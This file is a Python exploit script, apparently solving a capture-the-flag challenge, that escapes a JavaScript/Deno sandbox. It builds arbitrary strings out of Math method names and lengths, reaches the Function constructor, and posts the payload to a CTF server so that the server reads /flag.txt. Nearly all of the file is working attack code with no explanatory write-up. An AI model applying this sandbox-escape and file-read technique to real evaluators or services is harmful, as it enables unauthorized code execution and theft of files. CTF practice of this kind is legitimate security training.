import requests

math_methods = [
	c[5:-2] for c in """Math.abs()
Math.acos()
Math.acosh()
Math.asin()
Math.asinh()
Math.atan()
Math.atan2()
Math.atanh()
Math.cbrt()
Math.ceil()
Math.clz32()
Math.cos()
Math.cosh()
Math.exp()
Math.expm1()
Math.floor()
Math.fround()
Math.hypot()
Math.imul()
Math.log()
Math.log10()
Math.log1p()
Math.log2()
Math.max()
Math.min()
Math.pow()
Math.random()
Math.round()
Math.sign()
Math.sin()
Math.sinh()
Math.sqrt()
Math.tan()
Math.tanh()
Math.trunc()""".split("\n")
]

empty_string = ["Math.random.name.toString"]

integers = {}
integers[0] = ["Math.random.name.length.valueOf"]
integers[1] = integers[0] + ["Math.cos"]
integers[2] = integers[1] + ["Math.tan", "Math.ceil"]
integers[3] = ["Math.min.name.length.valueOf"]
integers[4] = ["Math.log2.name.length.valueOf"]
integers[5] = ["Math.log1p.name.length.valueOf"]
integers[6] = ["Math.fround.name.length.valueOf"]

integers[7] = integers[2] + ["Math.exp", "Math.floor"]
integers[8] = integers[2] + ["Math.exp", "Math.ceil"]
integers[9] = integers[6] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[10] = integers[7] + ["Math.exp", "Math.log2", "Math.floor"]
integers[11] = integers[7] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[12] = integers[8] + ["Math.exp", "Math.log2", "Math.ceil"]

integers[28] = integers[8] + ["Math.clz32"]
integers[29] = integers[4] + ["Math.clz32"]
integers[30] = integers[2] + ["Math.clz32"]
integers[31] = integers[1] + ["Math.clz32"]
integers[32] = integers[0] + ["Math.clz32"]

integers[27] = integers[28] + ["Math.clz32"]
integers[26] = integers[32] + ["Math.clz32"]

integers[37] = integers[26] + ["Math.exp", "Math.log2", "Math.floor"]
integers[38] = integers[27] + ["Math.exp", "Math.log2", "Math.floor"]
integers[39] = integers[27] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[40] = integers[28] + ["Math.exp", "Math.log2", "Math.floor"]
integers[41] = integers[29] + ["Math.exp", "Math.log2", "Math.floor"]
integers[42] = integers[29] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[43] = integers[30] + ["Math.exp", "Math.log2", "Math.floor"]
integers[44] = integers[30] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[45] = integers[31] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[46] = integers[32] + ["Math.exp", "Math.log2", "Math.floor"]
integers[47] = integers[32] + ["Math.exp", "Math.log2", "Math.ceil"]

integers[57] = integers[40] + ["Math.exp", "Math.log2", "Math.floor"]
integers[58] = integers[40] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[67] = integers[47] + ["Math.exp", "Math.log2", "Math.floor"]
integers[68] = integers[47] + ["Math.exp", "Math.log2", "Math.ceil"]

integers[82] = integers[57] + ["Math.exp", "Math.log2", "Math.floor"]
integers[83] = integers[57] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[84] = integers[58] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[96] = integers[67] + ["Math.exp", "Math.log2", "Math.floor"]
integers[97] = integers[67] + ["Math.exp", "Math.log2", "Math.ceil"]

integers[138] = integers[96] + ["Math.exp", "Math.log2", "Math.floor"]

integers[25] = integers[82] + ["Math.clz32"]
integers[24] = integers[138] + ["Math.clz32"]

integers[36] = integers[25] + ["Math.exp", "Math.log2", "Math.floor"]
integers[35] = integers[24] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[34] = integers[24] + ["Math.exp", "Math.log2", "Math.floor"]

integers[49] = integers[34] + ["Math.exp", "Math.log2", "Math.floor"]
integers[50] = integers[35] + ["Math.exp", "Math.log2", "Math.floor"]
integers[51] = integers[35] + ["Math.exp", "Math.log2", "Math.ceil"]
integers[52] = integers[36] + ["Math.exp", "Math.log2", "Math.ceil"]

integers[70] = integers[49] + ["Math.exp", "Math.log2", "Math.floor"]
integers[71] = integers[49] + ["Math.exp", "Math.log2", "Math.ceil"]

chars = {}

for i in range(10):
	chars[str(i)] = integers[i] + ["Math.exp.name.constructor"]

for method in math_methods:
	for i, c in enumerate(method):
		if c not in chars:
			chars[c] = integers[i] + [f"Math.{method}.name.charAt"]

for i in range(32, 128):
	if i in integers:
		chars[chr(i)] = integers[i] + ["Math.exp.name.constructor.fromCodePoint"]

clear_seeds = ["Math.seeds.pop"] * 5
join_seeds = empty_string + ["Math.seeds.join"]
eval_code = ["Math.random.constructor", "Math.seeds.map"]

def gen(code):
	return clear_seeds + [
		d for c in code for d in chars[c] + ["Math.seeds.push"]
	] + join_seeds + eval_code

#print(gen("return Deno.readTextFileSync('/flag.txt')"))

print(
	requests.post(
	"http://ctf.tcp1p.com:29997/", json=gen("return Deno.readTextFileSync('/flag.txt')")
	).text
)
